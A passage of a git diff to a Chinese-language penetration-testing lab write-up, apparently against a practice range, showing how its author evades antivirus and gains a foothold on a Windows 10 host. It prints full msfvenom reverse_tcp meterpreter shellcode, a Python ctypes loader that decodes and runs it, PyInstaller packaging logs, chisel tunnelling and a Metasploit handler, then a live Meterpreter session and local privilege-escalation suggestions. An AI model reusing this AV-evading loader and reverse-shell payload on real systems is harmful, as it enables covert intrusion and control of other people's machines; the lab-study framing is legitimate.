@@ -685,67 +685,69 @@ http://192.168.200.129:10002/index.php?m=client&f=download&version=1&link=SFRUUD
 
 使用 [Axx8/Bypass_AV: Bypass_AV msf 免杀，ShellCode 免杀加载器 ，免杀 shellcode 执行程序 ，360 & 火绒 & Windows Defender](https://github.com/Axx8/Bypass_AV) 对 msf 的马做一个免杀
 
-生成一下shellcode
+生成一下 shellcode
 
 ```shell
-$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 --encrypt base64 -f c
+┌──(randark ㉿ kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.20.30 LPORT=4444 --encrypt base64 -f c
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
-Payload size: 496 bytes
-Final size of c file: 2824 bytes
-unsigned char buf[] = 
-"\x2f\x45\x69\x42\x35\x50\x44\x2f\x2f\x2f\x2f\x6f\x7a\x41"
-"\x41\x41\x41\x45\x46\x52\x51\x56\x42\x53\x55\x55\x67\x78"
-"\x30\x6c\x5a\x6c\x53\x49\x74\x53\x59\x45\x69\x4c\x55\x68"
-"\x68\x49\x69\x31\x49\x67\x53\x49\x74\x79\x55\x45\x30\x78"
-"\x79\x55\x67\x50\x74\x30\x70\x4b\x53\x44\x48\x41\x72\x44"
-"\x78\x68\x66\x41\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42"
-"\x41\x63\x48\x69\x37\x56\x4a\x49\x69\x31\x49\x67\x51\x56"
-"\x47\x4c\x51\x6a\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59"
-"\x43\x77\x49\x50\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49"
-"\x67\x41\x41\x41\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42"
-"\x30\x45\x53\x4c\x51\x43\x43\x4c\x53\x42\x68\x51\x53\x51"
-"\x48\x51\x34\x31\x5a\x4e\x4d\x63\x6c\x49\x2f\x38\x6c\x42"
-"\x69\x7a\x53\x49\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63"
-"\x48\x4a\x44\x61\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78"
-"\x54\x41\x4e\x4d\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46"
-"\x68\x45\x69\x30\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c"
-"\x44\x45\x68\x45\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59"
-"\x73\x45\x69\x45\x46\x59\x51\x56\x68\x49\x41\x64\x42\x65"
-"\x57\x56\x70\x42\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b"
-"\x77\x67\x51\x56\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49"
-"\x69\x78\x4c\x70\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e"
-"\x64\x7a\x4d\x6c\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a"
-"\x69\x65\x5a\x49\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59"
-"\x6e\x6c\x53\x44\x48\x41\x55\x46\x42\x4a\x78\x38\x51\x43"
-"\x41\x42\x46\x63\x51\x56\x52\x4a\x69\x65\x52\x4d\x69\x66"
-"\x46\x42\x75\x6b\x78\x33\x4a\x67\x66\x2f\x31\x55\x79\x4a"
-"\x36\x6d\x67\x42\x41\x51\x41\x41\x57\x55\x47\x36\x4b\x59"
-"\x42\x72\x41\x50\x2f\x56\x61\x67\x4a\x5a\x55\x46\x42\x4e"
-"\x4d\x63\x6c\x4e\x4d\x63\x42\x49\x2f\x38\x42\x49\x69\x63"
-"\x4a\x42\x75\x75\x6f\x50\x33\x2b\x44\x2f\x31\x55\x69\x4a"
-"\x78\x32\x6f\x51\x51\x56\x68\x4d\x69\x65\x4a\x49\x69\x66"
-"\x6c\x42\x75\x73\x4c\x62\x4e\x32\x66\x2f\x31\x55\x67\x78"
-"\x30\x6b\x69\x4a\x2b\x55\x47\x36\x74\x2b\x6b\x34\x2f\x2f"
-"\x2f\x56\x54\x54\x48\x41\x53\x44\x48\x53\x53\x49\x6e\x35"
-"\x51\x62\x70\x30\x37\x44\x76\x68\x2f\x39\x56\x49\x69\x66"
-"\x6c\x49\x69\x63\x64\x42\x75\x6e\x56\x75\x54\x57\x48\x2f"
-"\x31\x55\x69\x42\x78\x4c\x41\x43\x41\x41\x42\x49\x67\x2b"
-"\x77\x51\x53\x49\x6e\x69\x54\x54\x48\x4a\x61\x67\x52\x42"
-"\x57\x45\x69\x4a\x2b\x55\x47\x36\x41\x74\x6e\x49\x58\x2f"
-"\x2f\x56\x53\x49\x50\x45\x49\x46\x36\x4a\x39\x6d\x70\x41"
-"\x51\x56\x6c\x6f\x41\x42\x41\x41\x41\x45\x46\x59\x53\x49"
-"\x6e\x79\x53\x44\x48\x4a\x51\x62\x70\x59\x70\x46\x50\x6c"
-"\x2f\x39\x56\x49\x69\x63\x4e\x4a\x69\x63\x64\x4e\x4d\x63"
-"\x6c\x4a\x69\x66\x42\x49\x69\x64\x70\x49\x69\x66\x6c\x42"
-"\x75\x67\x4c\x5a\x79\x46\x2f\x2f\x31\x55\x67\x42\x77\x30"
-"\x67\x70\x78\x6b\x69\x46\x39\x6e\x58\x68\x51\x66\x2f\x6e"
-"\x57\x47\x6f\x41\x57\x55\x6e\x48\x77\x76\x43\x31\x6f\x6c"
-"\x62\x2f\x31\x51\x3d\x3d";
+Payload size: 510 bytes
+Final size of c file: 2891 bytes
+unsigned char buf[] =
+"\x2f\x45\x69\x44\x35\x50\x44\x6f\x7a\x41\x41\x41\x41\x45"
+"\x46\x52\x51\x56\x42\x53\x53\x44\x48\x53\x5a\x55\x69\x4c"
+"\x55\x6d\x42\x52\x53\x49\x74\x53\x47\x45\x69\x4c\x55\x69"
+"\x42\x57\x54\x54\x48\x4a\x53\x41\x2b\x33\x53\x6b\x70\x49"
+"\x69\x33\x4a\x51\x53\x44\x48\x41\x72\x44\x78\x68\x66\x41"
+"\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42\x41\x63\x48\x69"
+"\x37\x56\x4a\x42\x55\x55\x69\x4c\x55\x69\x43\x4c\x51\x6a"
+"\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59\x43\x77\x49\x50"
+"\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49\x67\x41\x41\x41"
+"\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42\x30\x45\x53\x4c"
+"\x51\x43\x43\x4c\x53\x42\x68\x4a\x41\x64\x42\x51\x34\x31"
+"\x5a\x4e\x4d\x63\x6c\x49\x2f\x38\x6c\x42\x69\x7a\x53\x49"
+"\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63\x48\x4a\x44\x61"
+"\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78\x54\x41\x4e\x4d"
+"\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46\x68\x45\x69\x30"
+"\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c\x44\x45\x68\x45"
+"\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59\x73\x45\x69\x45"
+"\x46\x59\x51\x56\x68\x65\x57\x55\x67\x42\x30\x46\x70\x42"
+"\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b\x77\x67\x51\x56"
+"\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49\x69\x78\x4c\x70"
+"\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e\x64\x7a\x4d\x6c"
+"\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a\x69\x65\x5a\x49"
+"\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59\x6e\x6c\x53\x62"
+"\x77\x43\x41\x42\x46\x63\x43\x67\x41\x55\x48\x6b\x46\x55"
+"\x53\x59\x6e\x6b\x54\x49\x6e\x78\x51\x62\x70\x4d\x64\x79"
+"\x59\x48\x2f\x39\x56\x4d\x69\x65\x70\x6f\x41\x51\x45\x41"
+"\x41\x46\x6c\x42\x75\x69\x6d\x41\x61\x77\x44\x2f\x31\x57"
+"\x6f\x4b\x51\x56\x35\x51\x55\x45\x30\x78\x79\x55\x30\x78"
+"\x77\x45\x6a\x2f\x77\x45\x69\x4a\x77\x6b\x6a\x2f\x77\x45"
+"\x69\x4a\x77\x55\x47\x36\x36\x67\x2f\x66\x34\x50\x2f\x56"
+"\x53\x49\x6e\x48\x61\x68\x42\x42\x57\x45\x79\x4a\x34\x6b"
+"\x69\x4a\x2b\x55\x47\x36\x6d\x61\x56\x30\x59\x66\x2f\x56"
+"\x68\x63\x42\x30\x43\x6b\x6e\x2f\x7a\x6e\x58\x6c\x36\x4a"
+"\x4d\x41\x41\x41\x42\x49\x67\x2b\x77\x51\x53\x49\x6e\x69"
+"\x54\x54\x48\x4a\x61\x67\x52\x42\x57\x45\x69\x4a\x2b\x55"
+"\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41"
+"\x66\x6c\x56\x49\x67\x38\x51\x67\x58\x6f\x6e\x32\x61\x6b"
+"\x42\x42\x57\x57\x67\x41\x45\x41\x41\x41\x51\x56\x68\x49"
+"\x69\x66\x4a\x49\x4d\x63\x6c\x42\x75\x6c\x69\x6b\x55\x2b"
+"\x58\x2f\x31\x55\x69\x4a\x77\x30\x6d\x4a\x78\x30\x30\x78"
+"\x79\x55\x6d\x4a\x38\x45\x69\x4a\x32\x6b\x69\x4a\x2b\x55"
+"\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41"
+"\x66\x53\x68\x59\x51\x56\x64\x5a\x61\x41\x42\x41\x41\x41"
+"\x42\x42\x57\x47\x6f\x41\x57\x6b\x47\x36\x43\x79\x38\x50"
+"\x4d\x50\x2f\x56\x56\x31\x6c\x42\x75\x6e\x56\x75\x54\x57"
+"\x48\x2f\x31\x55\x6e\x2f\x7a\x75\x6b\x38\x2f\x2f\x2f\x2f"
+"\x53\x41\x48\x44\x53\x43\x6e\x47\x53\x49\x58\x32\x64\x62"
+"\x52\x42\x2f\x2b\x64\x59\x61\x67\x42\x5a\x53\x63\x66\x43"
+"\x38\x4c\x57\x69\x56\x76\x2f\x56";
 ```
 
-然后将shellcode加载进python脚本
+然后将 shellcode 加载进 python 脚本
 
 ```python
 import base64
@@ -790,71 +792,72 @@ def run(shellcode):
     ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
 
 if __name__ == '__main__':
-    ShellCode = ''' "\x2f\x45\x69\x42\x35\x50\x44\x2f\x2f\x2f\x2f\x6f\x7a\x41"
-"\x41\x41\x41\x45\x46\x52\x51\x56\x42\x53\x55\x55\x67\x78"
-"\x30\x6c\x5a\x6c\x53\x49\x74\x53\x59\x45\x69\x4c\x55\x68"
-"\x68\x49\x69\x31\x49\x67\x53\x49\x74\x79\x55\x45\x30\x78"
-"\x79\x55\x67\x50\x74\x30\x70\x4b\x53\x44\x48\x41\x72\x44"
-"\x78\x68\x66\x41\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42"
-"\x41\x63\x48\x69\x37\x56\x4a\x49\x69\x31\x49\x67\x51\x56"
-"\x47\x4c\x51\x6a\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59"
-"\x43\x77\x49\x50\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49"
-"\x67\x41\x41\x41\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42"
-"\x30\x45\x53\x4c\x51\x43\x43\x4c\x53\x42\x68\x51\x53\x51"
-"\x48\x51\x34\x31\x5a\x4e\x4d\x63\x6c\x49\x2f\x38\x6c\x42"
-"\x69\x7a\x53\x49\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63"
-"\x48\x4a\x44\x61\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78"
-"\x54\x41\x4e\x4d\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46"
-"\x68\x45\x69\x30\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c"
-"\x44\x45\x68\x45\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59"
-"\x73\x45\x69\x45\x46\x59\x51\x56\x68\x49\x41\x64\x42\x65"
-"\x57\x56\x70\x42\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b"
-"\x77\x67\x51\x56\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49"
-"\x69\x78\x4c\x70\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e"
-"\x64\x7a\x4d\x6c\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a"
-"\x69\x65\x5a\x49\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59"
-"\x6e\x6c\x53\x44\x48\x41\x55\x46\x42\x4a\x78\x38\x51\x43"
-"\x41\x42\x46\x63\x51\x56\x52\x4a\x69\x65\x52\x4d\x69\x66"
-"\x46\x42\x75\x6b\x78\x33\x4a\x67\x66\x2f\x31\x55\x79\x4a"
-"\x36\x6d\x67\x42\x41\x51\x41\x41\x57\x55\x47\x36\x4b\x59"
-"\x42\x72\x41\x50\x2f\x56\x61\x67\x4a\x5a\x55\x46\x42\x4e"
-"\x4d\x63\x6c\x4e\x4d\x63\x42\x49\x2f\x38\x42\x49\x69\x63"
-"\x4a\x42\x75\x75\x6f\x50\x33\x2b\x44\x2f\x31\x55\x69\x4a"
-"\x78\x32\x6f\x51\x51\x56\x68\x4d\x69\x65\x4a\x49\x69\x66"
-"\x6c\x42\x75\x73\x4c\x62\x4e\x32\x66\x2f\x31\x55\x67\x78"
-"\x30\x6b\x69\x4a\x2b\x55\x47\x36\x74\x2b\x6b\x34\x2f\x2f"
-"\x2f\x56\x54\x54\x48\x41\x53\x44\x48\x53\x53\x49\x6e\x35"
-"\x51\x62\x70\x30\x37\x44\x76\x68\x2f\x39\x56\x49\x69\x66"
-"\x6c\x49\x69\x63\x64\x42\x75\x6e\x56\x75\x54\x57\x48\x2f"
-"\x31\x55\x69\x42\x78\x4c\x41\x43\x41\x41\x42\x49\x67\x2b"
-"\x77\x51\x53\x49\x6e\x69\x54\x54\x48\x4a\x61\x67\x52\x42"
-"\x57\x45\x69\x4a\x2b\x55\x47\x36\x41\x74\x6e\x49\x58\x2f"
-"\x2f\x56\x53\x49\x50\x45\x49\x46\x36\x4a\x39\x6d\x70\x41"
-"\x51\x56\x6c\x6f\x41\x42\x41\x41\x41\x45\x46\x59\x53\x49"
-"\x6e\x79\x53\x44\x48\x4a\x51\x62\x70\x59\x70\x46\x50\x6c"
-"\x2f\x39\x56\x49\x69\x63\x4e\x4a\x69\x63\x64\x4e\x4d\x63"
-"\x6c\x4a\x69\x66\x42\x49\x69\x64\x70\x49\x69\x66\x6c\x42"
-"\x75\x67\x4c\x5a\x79\x46\x2f\x2f\x31\x55\x67\x42\x77\x30"
-"\x67\x70\x78\x6b\x69\x46\x39\x6e\x58\x68\x51\x66\x2f\x6e"
-"\x57\x47\x6f\x41\x57\x55\x6e\x48\x77\x76\x43\x31\x6f\x6c"
-"\x62\x2f\x31\x51\x3d\x3d" '''
+    ShellCode = '''"\x2f\x45\x69\x44\x35\x50\x44\x6f\x7a\x41\x41\x41\x41\x45"
+"\x46\x52\x51\x56\x42\x53\x53\x44\x48\x53\x5a\x55\x69\x4c"
+"\x55\x6d\x42\x52\x53\x49\x74\x53\x47\x45\x69\x4c\x55\x69"
+"\x42\x57\x54\x54\x48\x4a\x53\x41\x2b\x33\x53\x6b\x70\x49"
+"\x69\x33\x4a\x51\x53\x44\x48\x41\x72\x44\x78\x68\x66\x41"
+"\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42\x41\x63\x48\x69"
+"\x37\x56\x4a\x42\x55\x55\x69\x4c\x55\x69\x43\x4c\x51\x6a"
+"\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59\x43\x77\x49\x50"
+"\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49\x67\x41\x41\x41"
+"\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42\x30\x45\x53\x4c"
+"\x51\x43\x43\x4c\x53\x42\x68\x4a\x41\x64\x42\x51\x34\x31"
+"\x5a\x4e\x4d\x63\x6c\x49\x2f\x38\x6c\x42\x69\x7a\x53\x49"
+"\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63\x48\x4a\x44\x61"
+"\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78\x54\x41\x4e\x4d"
+"\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46\x68\x45\x69\x30"
+"\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c\x44\x45\x68\x45"
+"\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59\x73\x45\x69\x45"
+"\x46\x59\x51\x56\x68\x65\x57\x55\x67\x42\x30\x46\x70\x42"
+"\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b\x77\x67\x51\x56"
+"\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49\x69\x78\x4c\x70"
+"\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e\x64\x7a\x4d\x6c"
+"\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a\x69\x65\x5a\x49"
+"\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59\x6e\x6c\x53\x62"
+"\x77\x43\x41\x42\x46\x63\x43\x67\x41\x55\x48\x6b\x46\x55"
+"\x53\x59\x6e\x6b\x54\x49\x6e\x78\x51\x62\x70\x4d\x64\x79"
+"\x59\x48\x2f\x39\x56\x4d\x69\x65\x70\x6f\x41\x51\x45\x41"
+"\x41\x46\x6c\x42\x75\x69\x6d\x41\x61\x77\x44\x2f\x31\x57"
+"\x6f\x4b\x51\x56\x35\x51\x55\x45\x30\x78\x79\x55\x30\x78"
+"\x77\x45\x6a\x2f\x77\x45\x69\x4a\x77\x6b\x6a\x2f\x77\x45"
+"\x69\x4a\x77\x55\x47\x36\x36\x67\x2f\x66\x34\x50\x2f\x56"
+"\x53\x49\x6e\x48\x61\x68\x42\x42\x57\x45\x79\x4a\x34\x6b"
+"\x69\x4a\x2b\x55\x47\x36\x6d\x61\x56\x30\x59\x66\x2f\x56"
+"\x68\x63\x42\x30\x43\x6b\x6e\x2f\x7a\x6e\x58\x6c\x36\x4a"
+"\x4d\x41\x41\x41\x42\x49\x67\x2b\x77\x51\x53\x49\x6e\x69"
+"\x54\x54\x48\x4a\x61\x67\x52\x42\x57\x45\x69\x4a\x2b\x55"
+"\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41"
+"\x66\x6c\x56\x49\x67\x38\x51\x67\x58\x6f\x6e\x32\x61\x6b"
+"\x42\x42\x57\x57\x67\x41\x45\x41\x41\x41\x51\x56\x68\x49"
+"\x69\x66\x4a\x49\x4d\x63\x6c\x42\x75\x6c\x69\x6b\x55\x2b"
+"\x58\x2f\x31\x55\x69\x4a\x77\x30\x6d\x4a\x78\x30\x30\x78"
+"\x79\x55\x6d\x4a\x38\x45\x69\x4a\x32\x6b\x69\x4a\x2b\x55"
+"\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41"
+"\x66\x53\x68\x59\x51\x56\x64\x5a\x61\x41\x42\x41\x41\x41"
+"\x42\x42\x57\x47\x6f\x41\x57\x6b\x47\x36\x43\x79\x38\x50"
+"\x4d\x50\x2f\x56\x56\x31\x6c\x42\x75\x6e\x56\x75\x54\x57"
+"\x48\x2f\x31\x55\x6e\x2f\x7a\x75\x6b\x38\x2f\x2f\x2f\x2f"
+"\x53\x41\x48\x44\x53\x43\x6e\x47\x53\x49\x58\x32\x64\x62"
+"\x52\x42\x2f\x2b\x64\x59\x61\x67\x42\x5a\x53\x63\x66\x43"
+"\x38\x4c\x57\x69\x56\x76\x2f\x56" '''
     keys = 'Axx8'
-    shell_code = encode(ShellCode.strip().replace('"', '').replace('\n', ''),keys)
+    shell_code = encode(ShellCode.strip().replace('"','').replace('\n', ''),keys)
     shellcode = decode(shell_code,keys)
     shellcode = base64.b64decode(shellcode)
     run(shellcode)
 ```
 
-将python脚本打包为二进制文件
+将 python 脚本打包为二进制文件
 
 ```shell
-PS D:\_Code\test> pyinstaller -F -w .\Bypass_AV-20241102.py
-136 INFO: PyInstaller: 6.11.0, contrib hooks: 2024.9
-136 INFO: Python: 3.11.8
-142 INFO: Platform: Windows-10-10.0.22631-SP0
-143 INFO: Python environment: D:\_Code\test\env
-143 INFO: wrote D:\_Code\test\Bypass_AV-20241102.spec
-144 INFO: Module search paths (PYTHONPATH):
+PS D:\_Code\test> pyinstaller -F -w .\Bypass_AV-20250203.py
+227 INFO: PyInstaller: 6.11.0, contrib hooks: 2024.9
+227 INFO: Python: 3.11.8
+234 INFO: Platform: Windows-10-10.0.22631-SP0
+234 INFO: Python environment: D:\_Code\test\env
+235 INFO: wrote D:\_Code\test\Bypass_AV-20250203.spec
+238 INFO: Module search paths (PYTHONPATH):
 ['D:\\_Code\\test\\env\\Scripts\\pyinstaller.exe',
  'C:\\Users\\Randark\\AppData\\Local\\Programs\\Python\\Python311\\python311.zip',
  'C:\\Users\\Randark\\AppData\\Local\\Programs\\Python\\Python311\\DLLs',
@@ -866,23 +869,410 @@ PS D:\_Code\test> pyinstaller -F -w .\Bypass_AV-20241102.py
  'D:\\_Code\\test\\env\\Lib\\site-packages\\win32\\lib',
  'D:\\_Code\\test\\env\\Lib\\site-packages\\Pythonwin',
  'D:\\_Code\\test']
-408 INFO: checking Analysis
-414 INFO: checking PYZ
-427 INFO: checking PKG
-429 INFO: Bootloader D:\_Code\test\env\Lib\site-packages\PyInstaller\bootloader\Windows-64bit-intel\runw.exe
-429 INFO: checking EXE
-430 INFO: Rebuilding EXE-00.toc because Bypass_AV-20241102.exe missing
-430 INFO: Building EXE from EXE-00.toc
-430 INFO: Copying bootloader EXE to D:\_Code\test\dist\Bypass_AV-20241102.exe
-434 INFO: Copying icon to EXE
-435 INFO: Copying 0 resources to EXE
-436 INFO: Embedding manifest in EXE
-437 INFO: Appending PKG archive to EXE
-440 INFO: Fixing EXE headers
-486 INFO: Building EXE from EXE-00.toc completed successfully.
+601 INFO: checking Analysis
+601 INFO: Building Analysis because Analysis-00.toc is non existent
+601 INFO: Running Analysis Analysis-00.toc
+601 INFO: Target bytecode optimization level: 0
+601 INFO: Initializing module dependency graph...
+602 INFO: Initializing module graph hook caches...
+622 INFO: Analyzing base_library.zip ...
+1595 INFO: Processing standard module hook 'hook-heapq.py' from 'D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks'
+1646 INFO: Processing standard module hook 'hook-encodings.py' from 'D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks'
+2694 INFO: Processing standard module hook 'hook-pickle.py' from 'D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks'
+3632 INFO: Caching module dependency graph...
+3708 INFO: Looking for Python shared library...
+3717 INFO: Using Python shared library: C:\Users\Randark\AppData\Local\Programs\Python\Python311\python311.dll
+3717 INFO: Analyzing D:\_Code\test\Bypass_AV-20250203.py
+3732 INFO: Processing module hooks (post-graph stage)...
+3736 INFO: Performing binary vs. data reclassification (2 entries)
+3737 INFO: Looking for ctypes DLLs
+3756 INFO: Analyzing run-time hooks ...
+3757 INFO: Including run-time hook 'pyi_rth_inspect.py' from 'D:\\_Code\\test\\env\\Lib\\site-packages\\PyInstaller\\hooks\\rthooks'
+3761 INFO: Looking for dynamic libraries
+3877 INFO: Extra DLL search directories (AddDllDirectory): []
+3877 INFO: Extra DLL search directories (PATH): []
+4115 INFO: Warnings written to D:\_Code\test\build\Bypass_AV-20250203\warn-Bypass_AV-20250203.txt
+4127 INFO: Graph cross-reference written to D:\_Code\test\build\Bypass_AV-20250203\xref-Bypass_AV-20250203.html
+4147 INFO: checking PYZ
+4147 INFO: Building PYZ because PYZ-00.toc is non existent
+4147 INFO: Building PYZ (ZlibArchive) D:\_Code\test\build\Bypass_AV-20250203\PYZ-00.pyz
+4370 INFO: Building PYZ (ZlibArchive) D:\_Code\test\build\Bypass_AV-20250203\PYZ-00.pyz completed successfully.
+4381 INFO: checking PKG
+4381 INFO: Building PKG because PKG-00.toc is non existent
+4381 INFO: Building PKG (CArchive) Bypass_AV-20250203.pkg
+5786 INFO: Building PKG (CArchive) Bypass_AV-20250203.pkg completed successfully.
+5787 INFO: Bootloader D:\_Code\test\env\Lib\site-packages\PyInstaller\bootloader\Windows-64bit-intel\runw.exe
+5787 INFO: checking EXE
+5787 INFO: Building EXE because EXE-00.toc is non existent
+5787 INFO: Building EXE from EXE-00.toc
+5788 INFO: Copying bootloader EXE to D:\_Code\test\dist\Bypass_AV-20250203.exe
+6023 INFO: Copying icon to EXE
+6145 INFO: Copying 0 resources to EXE
+6145 INFO: Embedding manifest in EXE
+6270 INFO: Appending PKG archive to EXE
+6278 INFO: Fixing EXE headers
+6330 INFO: Building EXE from EXE-00.toc completed successfully.
 ```
 
-上传至靶机之后，执行文件
+上传至靶机之后，先添加端口转发和监听器
 
-![img](img/image_20241126-112629.png)
+```shell
+# Centos
+(remote) www@localhost.localdomain:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.128:1337 0.0.0.0:4444:127.0.0.1:4444 &
+[3] 36534
+2025/02/03 20:42:45 client: Connecting to ws://192.168.200.128:1337
+2025/02/03 20:42:45 client: tun: proxy#4444=>4444: Listening
+2025/02/03 20:42:45 client: Connected (Latency 1.042155ms)
 
+# kali
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:4444
+```
+
+执行文件
+
+![img](img/image_20250240-204033.png)
+
+成功上线
+
+```shell
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Sending stage (203846 bytes) to 127.0.0.1
+[*] Meterpreter session 5 opened (127.0.0.1:4444 -> 127.0.0.1:34504) at 2025-02-03 20:42:55 +0800
+
+meterpreter > sysinfo
+Computer        : WIN10
+OS              : Windows 10 (10.0 Build 18363).
+Architecture    : x64
+System Language : zh_CN
+Domain          : VULNTARGET
+Logged On Users : 6
+Meterpreter     : x64/windows
+```
+
+## win10 提权
+
+先进行探测
+
+```shell
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.0.20.66 - Collecting local exploits for x64/windows...
+[*] 10.0.20.66 - 198 exploit checks are being tried...
+[+] 10.0.20.66 - exploit/windows/local/bits_ntlm_token_impersonation: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!
+[+] 10.0.20.66 - exploit/windows/local/cve_2020_0796_smbghost: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/cve_2020_1313_system_orchestrator: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1909 build was detected!
+[+] 10.0.20.66 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!
+[+] 10.0.20.66 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
+[+] 10.0.20.66 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[*] Running check method for exploit 47 / 47
+[*] 10.0.20.66 - Valid modules for session 5:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bits_ntlm_token_impersonation            Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!
+ 7   exploit/windows/local/cve_2020_0796_smbghost                   Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/cve_2020_1313_system_orchestrator        Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
+ 11  exploit/windows/local/cve_2020_17136                           Yes                      The target appears to be vulnerable. A vulnerable Windows 10 v1909 build was detected!
